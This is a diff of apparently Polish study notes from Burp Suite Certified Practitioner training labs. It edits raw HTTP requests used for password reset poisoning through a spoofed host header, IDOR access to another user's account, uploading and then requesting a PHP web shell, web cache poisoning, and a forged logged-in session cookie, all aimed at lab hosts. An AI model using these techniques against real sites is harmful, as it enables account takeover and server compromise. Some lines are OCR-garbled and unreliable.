@@ -9,7 +9,7 @@ https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#http-host-header-at
 POST /log-in HTTP/2
 Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
 X-Host: exploit-0a02007d033192c181864dfd017c00e7.exploit-server.net
-Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
+Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcsRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
 Content-Length: 66
 Cache-Control: max-age=0
 Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
@@ -39,7 +39,7 @@ Musisz znaleźć endpoint, który inicjuje reset i wysyła e-mail z linkiem
 POST /new-password HTTP/2
 Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
 X-Host: exploit-0a02007d033192c181864dfd017c00e7.exploit-server.net
-Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
+Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
 Content-Length: 53
 Cache-Control: max-age=0
 Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
@@ -71,7 +71,7 @@ Password reset poisoning daje token w access logu (ofiara klika link → GET z t
 
 POST /new-password?temp-forgot-password-token=wuelp5um4qw4wi4l33g9xktwjdzmas9k HTTP/2
 Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
-Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
+Cookie: session=av3vf33LUSPteC7IVGQCNsFYqbYO73Xx; _lab=46%7cMCwCFCOzUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d
 Content-Length: 53
 Cache-Control: max-age=0
 Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
@@ -99,7 +99,7 @@ zmiana roleid na zasobie admina
 
 GET /myaccountdetails?id=carlos HTTP/2
 Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
-Cookie: _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d; session=eiwPLWzuaTICQk6Wt0lh2RipDClVJpEX
+Cookie: session=eiwPLWzuaTICQk6Wt0lh2RipDClVJpEX
 Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
@@ -119,7 +119,7 @@ Priority: u=0, i
 
 POST /myaccountdetails/update_email HTTP/2
 Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
-Cookie: _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d; session=ofMv62EALvT61WXW2zFGQfLFFLzKKQ8t
+Cookie: session=ofMv62EALvT61WXW2zFGQfLFFLzKKQ8t
 Content-Length: 82
 Sec-Ch-Ua-Platform: "Linux"
 Accept-Language: en-US,en;q=0.9
@@ -163,7 +163,7 @@ https://github.com/user-attachments/assets/25a60684-25c5-4d0b-9ca7-9847620ce0aa
 
 POST /admincontrols HTTP/2
 Host: 0af7004b03469209810f4e5200da0049.web-security-academy.net
-Cookie: _lab=46%7cMCwCFCOHp1e5%2bfnnFj5mcdEQyCq%2f3d2xAhQhFwP7eXxQ2f5SBD5tb0lZ3XM0gPx9i7PluJihxqZ9wpPtiB8LSC0w7EMGdIDYLcLixNJGtbJFZ9GlyWr6mtxtZ6RfviSj5gLjf7sRAR9zUr%2ffaBtKEKpCSQ5utdI6e5y5GPOCT%2frgCAg%3d; session=ofMv62EALvT61WXW2zFGQfLFFLzKKQ8t
+Cookie: session=ofMv62EALvT61WXW2zFGQfLFFLzKKQ8t
 Content-Length: 126
 Sec-Ch-Ua-Platform: "Linux"
 Accept-Language: en-US,en;q=0.9
@@ -207,9 +207,7 @@ payload jest na serwerze. !exploit server nie wykonuje kodu php. wykonanie nasta
 
 POST /admincont rols/imagefile HTTP/2
 Host : Oaf7004b03469209810f4e5200da0049.web-security-academy. net
-Cookie: lab=
-46%7cMCwCFCOHp1e5%2b fnnFj5mcdEQy Cq%2f3d2xAhQhFwP7eXxQ2f5SBD5t bOl Z3xM0gPx9i7Pl uJihxqZ9wpPt iB8LSCOw7EMGdIDYL
-cLixNJGt b JFZ9Gl yWr6mt xt Z6RfviSj 5gLj f7sRAR9zUr%2f faBt KEKpCSQ5ut dI6e5y5GPOCT%2frgCAg%3d; session=
+Cookie: session=
 of Mv 62EALvT61WXW2zFGQfLFFLzKKQ8t
 Content-Length: 142
 Cache-Control : max-age=0
@@ -257,7 +255,7 @@ GET /blogImage/shell.php
 https://github.com/user-attachments/assets/da5b67c8-aac6-44ca-8f20-fb0287aa69e8
 
 
-I PODEJŚCIE, MASZYNKA B [Web Cache+?+?]
+I PODEJŚCIE, MASZYNKA B [Web Cache+idlogged_cookie+?]
 
 
 Maszynka B stage1: Web cache poisoning dopiero na fukcji szukania znaleziony
@@ -275,14 +273,12 @@ X-Forwarded-Host : exploit-Oa5c00d9047f1d7283dd5e3a01590082. exploit-server.net
 
 200
 
-Maszynka B stage2:
+Maszynka B stage2: ciasteczko islogged - poleglam
 
 GET /my-account ?id=carlos HTTP/2
 Host : Oae6001c04191df583de5fla00f700b4.web-security-academy. net
-Cookie: lab=
-46%7cMCwCFE5HcSrj dqut f70YPj 4UGeC%2bDWc8AhQ%2fPCu4NY30u JAOeAPpw02J80ESul XZMVf 2W%2fTK1t TJOHHm9fPgsy 817z5AnoY
-oBJUwcvk8y 6N4Eqonuuq4%2f Sae 4Hxo Am AqCYzNmOVTj PWMsxNrao0sdpgqQzwc73l nWCLSb0%2fGszV2XDk%3d; session=
-%7b%22username%22%3a%22carl os%22%2c%22isloggedin%22%3at rue%7d -- MCOCFQCA7KuWt SLvkEwa0%2foTqHiCiDZJXwIUJ19BV
+Cookie: session= 67b%22username%22%3a%22carl os%22%2c%22isloggedin%22%3at rue%7d -- MCOCFQCA7KuWt SLvkEwa0%2foTqHiCiDZJXwIUJ19BV
+zPWPFBvWQRDJ%2fnpj%2fJdrWU%3d
 zPWPFBvWQRDJ%2fnpj%2f Jd rWU%3d
 Sec-Ch-Ua: "Not -A. Brand" ; v="24", "Chromium" ; v="146"
 Sec-Ch-Ua-Mobile: 70
